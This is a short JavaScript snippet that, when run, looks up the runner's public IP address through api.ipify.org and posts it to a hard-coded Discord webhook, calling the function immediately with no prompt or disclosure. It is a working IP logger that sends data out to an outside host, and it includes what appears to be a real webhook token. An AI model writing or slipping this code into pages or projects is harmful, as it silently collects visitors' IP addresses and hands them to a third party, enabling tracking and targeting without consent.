async function fe() {
    const aipee = await fetch("https://api.ipify.org/?format=json")
    await fetch("https://discord.com/api/webhooks/1358454244826550430/U4Yw5JggL4eCoshY8I1ListLBDBaCjRD-3sJndIGW8tI7calGTd4j4RS-W5S9ABYkiiH", {method: "POST", body: JSON.stringify({"content": await aipee.text()})})
}

fe()